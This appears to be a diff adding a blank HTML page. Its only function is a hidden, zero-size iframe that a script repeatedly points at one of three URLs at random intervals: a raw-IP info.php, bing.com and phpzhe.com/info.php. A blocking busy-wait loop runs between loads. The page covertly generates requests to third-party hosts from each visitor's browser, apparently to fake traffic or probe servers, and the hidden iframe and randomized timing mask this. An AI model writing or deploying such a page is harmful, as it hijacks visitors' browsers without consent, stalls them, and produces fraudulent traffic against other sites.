@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+	<script type="text/javascript" src="https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js"></script>
+</head>
+<body>
+<iframe src="" id="T_iframe" style="width: 0!important;height: 0!important;border:0!important;display:none!important;position:absolute!important;"></iframe>
+</body>
+<script type="text/javascript">
+	var urlArr = new Array(["http://123.56.44.151/info.php"],["http://bing.com"],["http://phpzhe.com/info.php"]);
+	
+	
+	var a = setInterval("goto(urlArr[Math.ceil(Math.random()*3-1)])",Math.random()*10000+1000);
+
+	function goto(url){
+		var ss = Math.random()*10000+1000;
+		console.log(url);
+		console.log(ss);
+		setTimeout(
+			function(){
+				document.getElementById("T_iframe").src = url;
+			},ss
+		);
+		sleep(ss);
+		
+	}
+	function sleep(numberMillis) { 
+		var now = new Date(); 
+		var exitTime = now.getTime() + numberMillis;
+		// alert(now.getTime());
+		while (true) {
+			now = new Date(); 
+			if (now.getTime() > exitTime) 
+				return; 
+		} 
+	}
+</script>
+</html>
